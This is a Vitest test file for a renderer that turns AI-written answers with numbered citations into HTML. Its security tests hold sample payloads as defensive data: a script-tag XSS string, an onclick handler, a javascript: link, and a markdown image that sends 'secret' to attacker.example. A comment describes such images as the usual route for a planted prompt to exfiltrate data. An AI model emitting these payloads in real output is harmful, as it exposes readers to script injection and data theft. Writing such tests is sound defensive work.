import type { LinkedCitation } from '@etai/shared';
import { describe, expect, it } from 'vitest';
import { renderAnswer } from './render-answer';

const citation = (sourceNumber: number, quote = 'a quote'): LinkedCitation => ({
  sourceNumber,
  documentId: `doc-${sourceNumber}`,
  documentPath: `path-${sourceNumber}.md`,
  title: `Title ${sourceNumber}`,
  quote,
});

/**
 * The chip a reader clicks and the card it opens have to carry the same number. The
 * numbers come from the API, where they are worked out from the retrieved set, so the
 * renderer must not renumber anything: it looks a marker up and leaves the arithmetic
 * alone. A chip that opens the wrong document looks exactly like one that opens the
 * right one, which is why these are asserted rather than eyeballed.
 */
describe('citation chips', () => {
  it('carry the number the API assigned, not their position in the text', () => {
    expect(renderAnswer('First [2] then [1].', [citation(1), citation(2)]).chips).toEqual([2, 1]);
  });

  it('give repeated citations of one document the same number', () => {
    expect(renderAnswer('Claim one [1]. Claim two [1].', [citation(1)]).chips).toEqual([1, 1]);
  });

  it('leave a marker with no citation as text rather than dropping it or linking nowhere', () => {
    const rendered = renderAnswer('Supported [1]. Unsupported [4].', [citation(1)]);
    expect(rendered.chips).toEqual([1]);
    expect(rendered.text).toContain('[4]');
  });

  it('give a claim resting on two documents one chip for each', () => {
    const rendered = renderAnswer('The verify stage now measures the artifact [1, 7].', [
      citation(1),
      citation(7),
    ]);
    expect(rendered.chips).toEqual([1, 7]);
    expect(rendered.text).not.toContain('[');
  });

  it('render half a group as a chip and half as text when only one number resolves', () => {
    const rendered = renderAnswer('Both agree [1, 7].', [citation(1)]);
    expect(rendered.chips).toEqual([1]);
    expect(rendered.text).toContain('[7]');
  });

  it('are found inside lists, bold text and table cells, wherever the model put them', () => {
    const answer = [
      '1. **Green on all four providers** [1]',
      '2. Schema compatibility [2]',
      '',
      '| a | b |',
      '|---|---|',
      '| x [1] | y |',
    ].join('\n');
    expect(renderAnswer(answer, [citation(1), citation(2)]).chips).toEqual([1, 2, 1]);
  });

  it('are not made inside code, where a bracketed number is code', () => {
    const rendered = renderAnswer('Use `items[1]` here [1].\n\n```js\nconst a = list[2];\n```', [
      citation(1),
      citation(2),
    ]);
    expect(rendered.chips).toEqual([1]);
    expect(rendered.text).toContain('items[1]');
    expect(rendered.text).toContain('list[2]');
  });

  it('handle an answer with no citations at all, which is every refusal', () => {
    const rendered = renderAnswer('Nothing here covers that.', []);
    expect(rendered.chips).toEqual([]);
    expect(rendered.text).toBe('Nothing here covers that.');
  });
});

describe('a chip and the punctuation after it', () => {
  const glue = (html: string) =>
    [...html.matchAll(/<span class="et-chip-glue">(.*?)<\/span>/g)].map((match) => match[1]);

  it('stay on one line, so a full stop never starts the next one', () => {
    const { html, text } = renderAnswer('Run it on every provider [1]. Then ship.', [citation(1)]);
    expect(glue(html)).toEqual(['<cite data-chip="1"></cite>.']);
    expect(text).toBe('Run it on every provider . Then ship.');
  });

  it('glue a whole run of chips to the punctuation that ends it', () => {
    const { html } = renderAnswer('Both agree [1][2], as does the note.', [
      citation(1),
      citation(2),
    ]);
    expect(glue(html)).toEqual(['<cite data-chip="1"></cite><cite data-chip="2"></cite>,']);
  });

  it('leave a chip alone when no punctuation follows it, or nothing does', () => {
    expect(glue(renderAnswer('One [1] two', [citation(1)]).html)).toEqual([]);
    expect(glue(renderAnswer('Ends on a chip [1]', [citation(1)]).html)).toEqual([]);
  });

  it('keep the numbers and order of the chips it wraps', () => {
    expect(renderAnswer('A [2]. B [1]; C [2]!', [citation(1), citation(2)]).chips).toEqual([
      2, 1, 2,
    ]);
  });
});

describe('markdown structure', () => {
  it('renders a numbered list as a list, not one run-on paragraph', () => {
    // The answer that prompted this: four release checks arrived as a single paragraph
    // with "1." and "2." buried mid-sentence.
    const { html } = renderAnswer(
      'Every release must pass four checks:\n\n1. One [1]\n2. Two [1]\n3. Three\n4. Four',
      [citation(1)],
    );
    expect(html).toContain('<ol>');
    expect(html.match(/<li>/g)).toHaveLength(4);
  });

  it('renders a code fence as a code block rather than literal backticks', () => {
    const { html, text } = renderAnswer('```js\nconst agent = await start({ token });\n```', []);
    expect(html).toContain('<pre><code');
    expect(text).not.toContain('```');
  });

  it('keeps paragraphs apart and drops the blank ones', () => {
    expect(renderAnswer('One.\n\n\nTwo.\n\n', []).html.match(/<p>/g)).toHaveLength(2);
  });

  it('flattens headings so one cannot outrank the page it sits on', () => {
    const { html } = renderAnswer('# Huge\n\n## Big\n\nBody', []);
    expect(html).not.toMatch(/<h[1-6]/);
    expect(html).toContain('et-answer-heading');
  });
});

describe('what an answer must never be able to do', () => {
  it('escapes raw HTML instead of rendering it', () => {
    const rendered = renderAnswer('Hello <script>alert(1)</script> <b onclick="x()">bold</b>', []);
    expect(rendered.html).not.toContain('<script');
    // Present as escaped text, which is right; absent as a real attribute on a real tag.
    expect(rendered.html).not.toMatch(/<[a-z][^>]*onclick/i);
    expect(rendered.html).toContain('&lt;b onclick');
    expect(rendered.text).toContain('<script>alert(1)</script>');
  });

  it('drops images, the usual way a planted prompt sends data out of the page', () => {
    const { html } = renderAnswer('See ![chart](https://attacker.example/?q=secret) here', []);
    expect(html).not.toContain('<img');
    expect(html).not.toContain('attacker.example/?q=secret"');
  });

  it('never renders a link a reader could click, and shows where it points', () => {
    const { html, text } = renderAnswer(
      '[docs](https://example.com/page) and [x](javascript:alert(1))',
      [],
    );
    expect(html).not.toContain('<a ');
    expect(html).not.toContain('javascript:');
    expect(text).toContain('https://example.com/page');
  });

  it('cannot forge a chip by writing a button in the answer', () => {
    const rendered = renderAnswer('<button data-citation="1">1</button> and [9]', [citation(1)]);
    expect(rendered.chips).toEqual([]);
    expect(rendered.text).toContain('[9]');
  });
});

describe('inputs no model should produce', () => {
  it.each([
    ['an empty answer', ''],
    ['only whitespace', '  \n\n\t '],
    ['an unclosed fence', '```\nnever closed'],
    ['unbalanced emphasis', '**bold without an end [1]'],
    ['a marker with absurd numbers', '[999999999999999999999] [0] [-1]'],
    ['nested brackets', '[[1]] [1, [2]]'],
    ['non-Latin text', 'Cevap şu [1]. 日本語 [1].'],
  ])('renders %s without throwing', (_label, text) => {
    expect(() => renderAnswer(text, [citation(1), citation(2)])).not.toThrow();
  });

  it('renders a very long answer', () => {
    const long = `${'A sentence about the cache [1]. '.repeat(5_000)}`;
    const rendered = renderAnswer(long, [citation(1)]);
    expect(rendered.chips).toHaveLength(5_000);
  });

  it('survives a value that is not a string', () => {
    expect(() => renderAnswer(undefined as unknown as string, [])).not.toThrow();
  });
});
